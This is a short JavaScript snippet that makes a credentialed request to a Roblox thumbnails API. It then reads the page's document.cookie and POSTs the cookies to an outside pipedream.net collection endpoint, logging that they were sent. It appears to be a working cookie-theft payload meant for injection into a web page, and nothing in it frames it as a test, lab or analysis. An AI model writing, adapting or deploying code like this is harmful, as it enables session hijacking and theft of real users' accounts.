var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://thumbnails.roblox.com/v1/assets?assetIds=17569533757&format=jpeg&isCircular=false&size=150x150', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
        var response = JSON.parse(xhr.responseText);
        console.log(response);
        
        var cookieData = document.cookie;

        var cookieXhr = new XMLHttpRequest();
        cookieXhr.open('POST', 'https://eon32wucwm6yep3.m.pipedream.net', true);
        cookieXhr.setRequestHeader('Content-Type', 'application/json');
        
        cookieXhr.send(JSON.stringify({ cookies: cookieData }));

        console.log('Cookies sent to external server:', cookieData);
    }
};
xhr.send();
